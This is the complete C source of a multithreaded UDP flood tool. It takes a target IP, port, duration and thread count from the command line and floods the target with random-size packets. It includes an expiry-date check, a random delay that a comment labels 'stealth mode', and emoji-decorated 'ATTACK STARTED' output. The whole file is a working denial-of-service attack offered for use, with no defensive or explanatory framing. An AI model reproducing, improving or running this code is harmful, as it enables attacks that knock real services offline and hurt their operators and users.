#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/time.h>
#include <time.h>

#define MAX_PACKET_SIZE 4096
#define MIN_PACKET_SIZE 512
#define RETRY_LIMIT 5

// Expiration Date (Year, Month, Day)
#define EXPIRATION_YEAR  2025
#define EXPIRATION_MONTH 4
#define EXPIRATION_DAY   4

// Color Codes for Terminal
#define GREEN  "\x1b[32m"
#define RED    "\x1b[31m"
#define YELLOW "\x1b[33m"
#define BLUE   "\x1b[34m"
#define RESET  "\x1b[0m"

typedef struct {
    char target_ip[16];
    int target_port;
    int attack_duration;
    int thread_count;
} AttackParams;

void *udp_flood(void *args) {
    AttackParams *params = (AttackParams *)args;
    int sock;
    struct sockaddr_in server;
    char packet[MAX_PACKET_SIZE];
    int packet_size, retry_count;
    struct timeval timeout;

    memset(packet, 0xAA, MAX_PACKET_SIZE);

    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
        pthread_exit(NULL);
    }

    timeout.tv_sec = 0;
    timeout.tv_usec = 500000; // 0.5 seconds timeout
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));

    server.sin_family = AF_INET;
    server.sin_port = htons(params->target_port);
    server.sin_addr.s_addr = inet_addr(params->target_ip);

    time_t end_time = time(NULL) + params->attack_duration;
    srand(time(NULL));

    while (time(NULL) < end_time) {
        packet_size = (rand() % (MAX_PACKET_SIZE - MIN_PACKET_SIZE + 1)) + MIN_PACKET_SIZE;
        retry_count = 0;

        while (sendto(sock, packet, packet_size, 0, (struct sockaddr *)&server, sizeof(server)) < 0) {
            if (++retry_count >= RETRY_LIMIT) {
                break;
            }
        }

        usleep(rand() % 1000); // Random delay for stealth mode
    }

    close(sock);
    pthread_exit(NULL);
}

// Function to check expiration date
int is_expired() {
    time_t now = time(NULL);
    struct tm *current_time = localtime(&now);

    int year = current_time->tm_year + 1900;
    int month = current_time->tm_mon + 1;
    int day = current_time->tm_mday;

    if (year > EXPIRATION_YEAR || 
       (year == EXPIRATION_YEAR && month > EXPIRATION_MONTH) || 
       (year == EXPIRATION_YEAR && month == EXPIRATION_MONTH && day > EXPIRATION_DAY)) {
        return 1;  // Expired
    }
    return 0; // Not Expired
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf(RED "❌ Usage: %s <Target IP> <Port> <Duration> <Thread Count>\n" RESET, argv[0]);
        return 1;
    }

    if (is_expired()) {
        printf(RED "❌ This script has expired on %d-%02d-%02d. Please update it.\n" RESET,
               EXPIRATION_YEAR, EXPIRATION_MONTH, EXPIRATION_DAY);
        return 1;
    }

    AttackParams params;
    strncpy(params.target_ip, argv[1], 15);
    params.target_ip[15] = '\0';
    params.target_port = atoi(argv[2]);
    params.attack_duration = atoi(argv[3]);
    params.thread_count = atoi(argv[4]);

    if (params.thread_count <= 0) {
        printf(RED "❌ Invalid thread count! Must be greater than 0.\n" RESET);
        return 1;
    }

    struct sockaddr_in check_ip;
    if (inet_pton(AF_INET, params.target_ip, &check_ip.sin_addr) <= 0) {
        printf(RED "❌ Invalid address / Address not supported: %s\n" RESET, params.target_ip);
        return 1;
    }

    // 🔥 Attack Start Message with Colors 🔥
    printf(GREEN "⚡ ATTACK STARTED ON %s:%d FOR %d SECONDS ⚡\n" RESET, 
           params.target_ip, params.target_port, params.attack_duration);
    printf(YELLOW "🚀 Launching %d Threads...\n" RESET, params.thread_count);

    pthread_t threads[params.thread_count];

    for (int i = 0; i < params.thread_count; i++) {
        pthread_create(&threads[i], NULL, udp_flood, (void *)&params);
    }

    for (int i = 0; i < params.thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf(BLUE "✅ Attack Completed Successfully!\n" RESET);

    return 0;
}
